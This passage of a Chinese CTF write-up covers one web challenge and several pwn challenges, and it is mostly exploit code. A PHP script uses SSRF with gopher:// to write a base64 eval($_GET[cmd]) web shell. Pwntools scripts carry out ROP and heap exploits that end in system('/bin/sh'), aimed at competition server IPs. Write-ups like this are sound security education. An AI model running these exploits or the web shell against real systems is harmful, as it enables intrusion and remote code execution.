class="string">&quot;\r\n&quot;</span>, <span class="variable">$header</span>);</span><br><span class="line"><span class="variable">$a</span> .= <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&quot;gopher://127.0.0.1:40000/_&quot;</span> . (<span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;+&quot;</span>, <span class="string">&quot; &quot;</span>, <span class="variable">$payload</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">urlencode</span>(<span class="variable">$payload</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;curl -vv http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=<span class="subst">$payload</span>&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>content 貌似是对 &lt;? php &#x3D; 有关键字过滤，含有这些的就会被 404 ，猜测是用了<code>file_put_contents</code>，并且它支持 php 伪协议写文件，所以可以尝试用 base64 进行绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_payload</span>(<span class="params"><span class="variable">$session</span>, <span class="variable">$filename</span>, <span class="variable">$content</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$header</span> = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">User-Agent: curl/7.64.1</span></span><br><span class="line"><span class="string">Accept: */*</span></span><br><span class="line"><span class="string">Content-Length: 0</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=<span class="subst">$session</span></span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span> = <span class="string">&quot;file=&quot;</span> . <span class="title function_ invoke__">urlencode</span>(<span class="variable">$filename</span>) . <span class="string">&quot;&amp;content=&quot;</span> . <span class="title function_ invoke__">urlencode</span>(<span class="variable">$content</span>);</span><br><span class="line">    <span class="variable">$length</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$header</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;Content-Length: 0&quot;</span>, <span class="string">&quot;Content-Length: <span class="subst">$length</span>&quot;</span>, <span class="variable">$header</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;\r\n&quot;</span>, <span class="variable">$header</span>);</span><br><span class="line">    <span class="variable">$a</span> .= <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$payload</span> = <span class="string">&quot;gopher://127.0.0.1:40000/_&quot;</span> . (<span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>));</span><br><span class="line">    <span class="variable">$payload</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;+&quot;</span>, <span class="string">&quot; &quot;</span>, <span class="variable">$payload</span>);</span><br><span class="line">    <span class="variable">$payload</span> = <span class="title function_ invoke__">urlencode</span>(<span class="variable">$payload</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$payload</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$content1</span> = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">PD89IGV2YWwoJF9HRVRbY21kXSk7</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">get_payload</span>(<span class="string">&quot;test222&quot;</span>, <span class="string">&quot;php://filter/convert.base64-decode/resource=index.php&quot;</span>, <span class="variable">$content1</span>);</span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=<span class="subst">$payload</span>&quot;</span>);</span><br></pre></td></tr></table></figure>


<h2><span id="pwn">Pwn</span><a href="#pwn" class="header-anchor"></a></h2><h3><span id="qwblogin">qwblogin</span><a href="#qwblogin" class="header-anchor"></a></h3><p>先逆向过pow,前三个字节直接爆破出来QWQ。之后下断看到是断在了read 0x21的地方。<br>随便输点东西，跟着后面调试外加看ida的反编译加看官方文档大体可以看出来是将输入的东西分为4组，每组8字节，分别跟一些固定的数字xor，随后cmp对比。<br>逆向下来是这样的字符串</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;G00DR3VR&#x27;</span>+<span class="string">&#x27;W31LD0N3&#x27;</span>+<span class="string">&#x27;Try2Pwn!&#x27;</span>+<span class="string">&#x27;GOGOGOGO&#x27;</span></span><br></pre></td></tr></table></figure>
<p>之后会再进入一个read流程，下断可以看出来是read 0 stack 0x800。stack为程序虚拟的栈空间。<br>跟c类似的是，这个存在栈溢出。所以最后类似这种形式 0x100*’a’+p64(rbp)+p64(ret_addr)<br>再调用ret。很明显一个基于vm的栈溢出（指溢出vm的栈跳vm的code<br>然后回check这个偏移不大于0x1000，也就是跳不出code区，只能用程序原本就带的code来执行。我们写入不了opcode。<br>因为是类c的写法，所以找gadget也可以参考c的pop ret的方法。去搜索0x11(ret)。<br>人肉识别下来是有了syscall的所有调用&#x2F;&#x2F;0x8 0x9 0xa<br>以及能控制所有的syscall所需要的参数。&#x2F;&#x2F;a1[0] a1[1] a1[2] a1[3]<br>之后用程序自带的orw功能去搞就行。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">flag=<span class="built_in">chr</span>(<span class="number">0x51</span>)+<span class="built_in">chr</span>(<span class="number">0x57</span>)+<span class="built_in">chr</span>(<span class="number">0x51</span>)</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gd</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    gdb.attach(r,cmd)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="comment">#r=process(&#x27;sh&#x27;,&#x27;./launch.sh&#x27;)</span></span><br><span class="line"><span class="comment">#r=process([&#x27;./emulator&#x27;,&#x27;./test.bin&#x27;])</span></span><br><span class="line">r=remote(<span class="string">&#x27;47.94.20.173&#x27;</span>,<span class="number">32142</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;password:&#x27;</span>)</span><br><span class="line">r.send(flag)</span><br><span class="line"><span class="comment">#gd(&#x27;b *$rebase(0x1272)&#x27;)</span></span><br><span class="line">r.sendline(<span class="string">&#x27;G00DR3VR&#x27;</span>+<span class="string">&#x27;W31LD0N3&#x27;</span>+<span class="string">&#x27;Try2Pwn!&#x27;</span>+<span class="string">&#x27;GOGOGOGO&#x27;</span>)</span><br><span class="line"><span class="comment">#gd()</span></span><br><span class="line">syscall9=<span class="number">0x617</span></span><br><span class="line">syscall=<span class="number">0x5b0</span>+<span class="number">1</span></span><br><span class="line">sy=<span class="number">0x6ed</span></span><br><span class="line">p0r=<span class="number">0x2f5</span></span><br><span class="line">p1r=<span class="number">0x377</span></span><br><span class="line">p2r=<span class="number">0x45c</span></span><br><span class="line">p3r=<span class="number">0x4e1</span></span><br><span class="line"><span class="comment">#gd(&#x27;b read&#x27;)p64(p0r)+p64(2)</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x108</span></span><br><span class="line">payload+=p64(p0r)+p64(<span class="number">1</span>)+p64(p1r)+p64(<span class="number">0</span>)+p64(p2r)+p64(<span class="number">0x100</span>)+p64(p3r)+p64(<span class="number">0x40</span>)+p64(syscall)+p64(p0r)+p64(<span class="number">0</span>)+p64(p1r)+p64(<span class="number">0x100</span>)+p64(p2r)+p64(<span class="number">0</span>)+p64(sy)+p64(p0r)+p64(<span class="number">1</span>)+p64(p1r)+p64(<span class="number">4</span>)+p64(p2r)+p64(<span class="number">0x200</span>)+p64(p3r)+p64(<span class="number">0x100</span>)+p64(syscall)+p64(p0r)+p64(<span class="number">2</span>)+p64(p1r)+p64(<span class="number">1</span>)+p64(p2r)+p64(<span class="number">0x1ff</span>)+p64(p3r)+p64(<span class="number">0x100</span>)+p64(syscall)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.send(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3><span id="direct">direct</span><a href="#direct" class="header-anchor"></a></h3><p>负数溢出，在edit的时候，offset可以为负数，这种情况下可以去修改chunk的size以及向上修改很长的区域。<br>但没有leak函数。打stdout因为没有任何跟io有关的操作也实现不了。<br>在readdir那边的操作时候，可以先readdir完随后通过修改size分配unsorted bin去写入libc地址，然后给下一个将被readdir给读取出来的字符串连起来。<br>最后一发入魂。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">ch</span>):</span><br><span class="line">	r.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(ch))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">	menu(<span class="number">1</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	r.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,offset,size,content</span>):</span><br><span class="line">	menu(<span class="number">2</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	r.sendlineafter(<span class="string">&#x27;Offset: &#x27;</span>,<span class="built_in">str</span>(offset))</span><br><span class="line">	r.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	r.sendafter(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">	menu(<span class="number">3</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">openfile</span>():</span><br><span class="line">	menu(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">closefile</span>():</span><br><span class="line">	menu(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gd</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">	gdb.attach(r,cmd)</span><br><span class="line">	pause()</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&#x27;./direct&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&#x27;106.14.214.3&#x27;</span>,<span class="number">1912</span>)</span><br><span class="line">libc =ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x50</span>)</span><br><span class="line">openfile()</span><br><span class="line">closefile()</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">0</span>,-<span class="number">0x10</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x80a1</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xe0</span>)</span><br><span class="line">edit(<span class="number">1</span>,-<span class="number">0x7fe8</span>,<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x37</span>+<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">closefile()</span><br><span class="line">r.recvuntil(<span class="string">&#x27;aaaab&#x27;</span>)</span><br><span class="line">leak=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(leak)</span><br><span class="line">lbase=leak-<span class="number">96</span>-<span class="number">0x10</span>-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#gd()</span></span><br><span class="line">edit(<span class="number">4</span>,-<span class="number">0xa0</span>,<span class="number">0x10</span>,p64(lbase+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0</span>,<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="number">0</span>,<span class="number">0x10</span>,p64(lbase+libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h3><span id="easypwn">easypwn</span><a href="#easypwn" class="header-anchor"></a></h3><p>首先一个off by null 可以构造一个堆块重叠,然后爆破半个字节并利用unsorted bin attack 攻击 global_max_fast,之后则是一个 free对应大小的块 越界后覆盖stdout的read_end 和 write_ptr指针,并令覆盖的内容相同 即可 leak libc_base,之后则是一个攻击 malloc_hook写入rce的ez操作</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context.log_level =&#x27;DEBUG&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">ch</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="built_in">str</span>(ch))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size</span>):</span><br><span class="line">	menu(<span class="number">1</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">	menu(<span class="number">2</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendafter(<span class="string">&#x27;content:&#x27;</span>,	content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">	menu(<span class="number">3</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">F</span>(<span class="params">index</span>):</span><br><span class="line">	sleep(<span class="number">0.05</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	sleep(<span class="number">0.05</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">E</span>(<span class="params">index,content</span>):</span><br><span class="line">	sleep(<span class="number">0.05</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	sleep(<span class="number">0.05</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">	sleep(<span class="number">0.05</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	p  = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">	libc =ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment">#	p = remote(&#x27;39.101.184.181&#x27;,10000)</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		new(<span class="number">0x18</span>)	<span class="comment">#0</span></span><br><span class="line">		new(<span class="number">0x2F8</span>)  <span class="comment">#1</span></span><br><span class="line">		new(<span class="number">0x2F8</span>)  <span class="comment">#2</span></span><br><span class="line">		new(<span class="number">0x380</span>)  <span class="comment">#3</span></span><br><span class="line">		new(<span class="number">0x380</span>)  <span class="comment">#4</span></span><br><span class="line">		new(<span class="number">0x380</span>)  <span class="comment">#5</span></span><br><span class="line">		new(<span class="number">0x380</span>)  <span class="comment">#6</span></span><br><span class="line">		new(<span class="number">0x380</span>)  <span class="comment">#7</span></span><br><span class="line">		edit(<span class="number">7</span>,(p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))*<span class="number">0x38</span>)</span><br><span class="line">		new(<span class="number">0x18</span>)   <span class="comment">#8</span></span><br><span class="line">		free(<span class="number">0</span>)</span><br><span class="line">		edit(<span class="number">1</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x2F0</span> + p64(<span class="number">0x320</span>))</span><br><span class="line">		free(<span class="number">2</span>)</span><br><span class="line">		<span class="comment">####################</span></span><br><span class="line">		new(<span class="number">0x18</span>)   <span class="comment">#0</span></span><br><span class="line">		new(<span class="number">0x78</span>)   <span class="comment">#2</span></span><br><span class="line">		new(<span class="number">0x78</span>)   <span class="comment">#9</span></span><br><span class="line">		new(<span class="number">0xF8</span>)   <span class="comment">#10</span></span><br><span class="line">		new(<span class="number">0x88</span>)   <span class="comment">#11</span></span><br><span class="line">		new(<span class="number">0x68</span>)   <span class="comment">#12</span></span><br><span class="line">		new(<span class="number">0x2F8</span>)  <span class="comment">#13</span></span><br><span class="line"></span><br><span class="line">		free(<span class="number">2</span>)</span><br><span class="line">		edit(<span class="number">9</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x70</span> + p64(<span class="number">0x100</span>))</span><br><span class="line">		free(<span class="number">10</span>)</span><br><span class="line">		new(<span class="number">0x78</span>) <span class="comment">#2</span></span><br><span class="line">		new(<span class="number">0x78</span>) <span class="comment">#10 = 9</span></span><br><span class="line">		new(<span class="number">0xF8</span>) <span class="comment">#14</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		free(<span class="number">2</span>)</span><br><span class="line">		edit(<span class="number">1</span>,p64(<span class="number">0</span>) + <span class="string">&#x27;\xE8\x37\n&#x27;</span>)</span><br><span class="line">		new(<span class="number">0x70</span>)</span><br><span class="line">		edit(<span class="number">1</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x78</span> + p64(<span class="number">0x1631</span>) +  <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">		free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">		E(<span class="number">1</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x78</span> + p64(<span class="number">0x1651</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">		F(<span class="number">10</span>)</span><br><span class="line">		libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7F&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">131</span> - libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">		log.info(<span class="string">&#x27;LIBC:\t&#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">		malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">		rce = libc_base + <span class="number">0xF0364</span></span><br><span class="line">		free(<span class="number">12</span>)</span><br><span class="line">		edit(<span class="number">1</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x288</span> + p64(<span class="number">0x71</span>) + p64(malloc_hook - <span class="number">0x23</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">		new(<span class="number">0x60</span>) <span class="comment">#9</span></span><br><span class="line">		new(<span class="number">0x60</span>) <span class="comment">#10</span></span><br><span class="line">		edit(<span class="number">10</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x13</span> + p64(rce) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">		new(<span class="number">0x10</span>)</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		p.close()</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3><span id="oldschool">oldschool</span><a href="#oldschool" class="header-anchor"></a></h3><p>审计一下给的源文件即可知道,在mmap_edit中因为 &lt; 和 &gt; 符号搞错了,导致越界,往一个地址写入一个64位长的整型变量,此时只需要leak libc,然后计算出此偏移,因为mmap_edit时的指针类型为int类型,所以 需要之前 offset&gt;&gt;2 才是正确的offset,之后就是往free_hook写入一个system,free(‘&#x2F;bin&#x2F;sh’)即可getshell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level =<span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">ch</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="built_in">str</span>(ch))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">index,size</span>):</span><br><span class="line">	menu(<span class="number">1</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">	menu(<span class="number">2</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendafter(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">	menu(<span class="number">3</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">	menu(<span class="number">4</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">m_new</span>(<span class="params">index</span>):</span><br><span class="line">	menu(<span class="number">6</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;start: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">m_edit</span>(<span class="params">index,value</span>):</span><br><span class="line">	menu(<span class="number">7</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Value: 